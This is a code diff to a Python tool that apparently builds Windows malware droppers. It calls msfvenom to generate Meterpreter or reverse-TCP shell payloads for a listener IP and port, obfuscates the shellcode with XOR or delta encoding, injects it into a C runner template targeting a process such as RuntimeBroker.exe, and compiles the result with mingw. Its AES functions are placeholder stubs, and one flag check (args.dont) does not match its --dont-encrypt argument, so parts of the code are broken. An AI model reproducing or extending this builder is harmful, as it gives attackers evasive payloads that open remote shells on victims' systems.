@@ -25,17 +25,18 @@ inputgroup.add_argument('--file', help='Custom shellcode file')
 inputgroup.add_argument('--msf', help='Generate a Meterpreter template payload.', action="store_true")
 inputgroup.add_argument('--shell', help='Generate a reverse shell (cmd) template payload.',  action="store_true")
 
-# Templating
+# Templating options
 parser.add_argument('-L', '--lhost', help='Listener IP for templates.')
 parser.add_argument('-P', '--lport', help='Listener port for templates.')
 
 # Encryption Grouping
 encgroup = parser.add_argument_group('encryption')
-encgroup = encgroup.add_mutually_exclusive_group(required=True)
+encgroup = encgroup.add_mutually_exclusive_group()
 encgroup.add_argument('--xor', help='Use XOR encryption.', action="store_true")
 encgroup.add_argument('--delta', help='Use delta encoding from Red Siege\'s delta encoder.', action="store_true")
-parser.add_argument('--dont-encrypt', help='Don\'t encrypt the payload. Default is AES-256', action="store_true")
+encgroup.add_argument('--dont-encrypt', help='Don\'t encrypt the payload.', action="store_true")
 
+# Generation options (add camo stuff)
 parser.add_argument('--process', help='Target process name for creation or remote injection. Default is RuntimeBroker.exe.')
 parser.add_argument('--export', help='Exported function name for DLL.')
 
@@ -54,21 +55,7 @@ def generateTemplate():
 		subprocess.run(["msfvenom","-p","windows/x64/shell_reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
 	return
 
-# Compile to binary
-def compile():
-	if args.output.endswith(".exe"): # PE compilation
-		p = subprocess.run([f"x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./src/* -o ./output/{args.output}"], shell=True, capture_output=True)
-		if "ld returned 1 exit status" in p.stderr.decode():
-			print("[-] Compilation failed.")
-			exit()
-		else:
-			print("[+] Compilation successful. Check output folder.")
-			exit()
-
-	if args.output.endswith(".dll"): # DLL compilation (TO-DO)
-		print("WIP1")
-	return
-
+# Read in shellcode, byte by byte into a list
 def readShellcode(filePath):
 
 	shellcode = []
@@ -81,15 +68,32 @@ def readShellcode(filePath):
 
 	return shellcode
 
+# Compile to binary
+def compile():
+	if args.output.endswith(".exe"): # PE compilation
+		p = subprocess.run([f"x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./src/* -o ./output/{args.output}"], shell=True, capture_output=True)
+		if "returned 1 exit status" in p.stderr.decode():
+			print("[-] Compilation failed.")
+			exit()
+		else:
+			print("[+] Compilation successful. Check output folder.")
+			exit()
+
+	if args.output.endswith(".dll"): # DLL compilation (TO-DO)
+		print("WIP1")
+
+	return
+
+# Takes in a list of bytes for shellcode and a list of strings for decryption blob
 def writePayload(shellcode, blob):
 
-	# Read in current runner
+	## Read in runner template lines
 	mainFileR = open("./setup/template.c", "r")
 	mainLines = mainFileR.readlines()
 	mainFileR.close()
 
 	
-	# Loop over lines and update payload / size
+	## Loop over lines and update payload / size
 	newLines = []
 	for line in mainLines:
 
@@ -110,7 +114,7 @@ def writePayload(shellcode, blob):
 
 		newLines.append(line)
 
-	# Update decryption protocol
+	## Update decryption protocol
 	for i in range(0,len(newLines)):
 		if "SIZE_T sPayloadSize" in newLines[i]:
 			newLines[i+1:i+1] = blob
@@ -122,6 +126,7 @@ def writePayload(shellcode, blob):
 	
 	return
 
+# Red Siege's delta encoder. Was curious so decided to add it
 def encryptDelta(shellcode):
 	# read in our raw shellcode and get the length
 	raw_sc = b''.join(shellcode)
@@ -149,6 +154,7 @@ def encryptDelta(shellcode):
 
 	return offset_arr, raw_sc, sc_len
 
+# Delta decryption blob
 def deltaBlob(offset_arr,raw_sc,sc_len):
 
 	blob = '\tunsigned char first_byte = ' + hex(raw_sc[0]) + ';\n'
@@ -166,6 +172,7 @@ def deltaBlob(offset_arr,raw_sc,sc_len):
 	
 	return blob
 
+# XOR encryption 
 def encryptXOR(shellcode):
 
 	key = os.urandom(32) # XOR KEY LENGTH!
@@ -177,7 +184,8 @@ def encryptXOR(shellcode):
 
 	return encrypted, key
 
-def xorList(key):
+# XOR decryption blob
+def xorBlob(key):
 
 	keyLine = "\tBYTE pKey[] = { "
 	for i in range(0,len(key)):
@@ -197,8 +205,22 @@ def xorList(key):
 	"""
 	return blob
 
+# AES encryption
+def encryptAES(shellcode):
+	print("Encrypt me!")
+	key = 1
+	iv = 1
+	return shellcode, key, iv
+
+# AES decryption blob
+def aesBlob(key, iv):
+	print("AES BLOB!!")
+	blob = "HASDFASDF!!"
+	return blob
+
+
 def main():
-	# Generate templates if necessary
+	#### Generate templates if necessary
 	if args.msf or args.shell:
 		print(f"[~] Generating shellcode from template. (IP: {args.lhost}, PORT: {args.lport})")
 		generateTemplate()
@@ -207,20 +229,22 @@ def main():
 		print(f"[!] Using custom shellcode file {args.file}")
 		shellcode = readShellcode(args.file)
 
-	# Encrypt payload (check xor and don't-encrypt)
+	#### Encrypt payload
 	print("[~] Encrypting payload...")
-	if args.xor:
+
+	if args.xor: # XOR
 		shellcode, key  = encryptXOR(shellcode)
-		writePayload(shellcode, xorList(key))
-	else:
+		writePayload(shellcode, xorBlob(key))
+	elif args.delta: # DELTA
 		offset_arr,raw_sc,sc_len = encryptDelta(shellcode)
 		writePayload(shellcode, deltaBlob(offset_arr,raw_sc,sc_len))
+	elif args.dont: # DON'T ENCRYPT
+		writePayload(shellcode, None)
+	else: # DEFAULT - AES-256
+		shellcode, key, iv = encryptAES(shellcode)
+		writePayload(shellcode, aesBlob(key,iv))
 
-
-	# Update dropper file wrapper (update payload, process name, export)
-	print("[~] Writing payload to dropper...")
-
-	# Compile (x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./src/* -o ./output/shroud.exe)
+	#### Compile
 	print("[~] Compiling...")
 	compile()
 
